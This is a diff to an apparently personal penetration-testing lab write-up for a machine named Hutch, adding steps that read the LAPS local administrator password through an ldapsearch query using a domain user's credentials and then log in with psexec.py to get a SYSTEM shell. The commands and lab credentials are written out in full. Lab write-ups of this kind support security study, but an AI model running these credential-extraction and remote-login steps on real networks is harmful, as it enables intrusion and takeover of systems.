@@ -268,6 +268,17 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "c:\Program Files" directory and shows that Microsoft's _Local Administrator Password Solution (LAPS) is installed:
 
+![](Pasted%20image%2020221019012502.png)
+
+![](Pasted%20image%2020221019012617.png)
+#LAPS #LocalAdministratorPasswordSolution
+
+#### -I attempt to query LDAP for the local administrator password by typing "ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd" and find administrators password is ",G4$4Yk-2n&x(]":
+
+![](Pasted%20image%2020221019012818.png)
+
+#### - Now that I have valid aministrator credentials I login with psexec.py by typing "python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122" and receive a shell as nt authority\system:
+
 
 
 ## Privilege Escalation vector
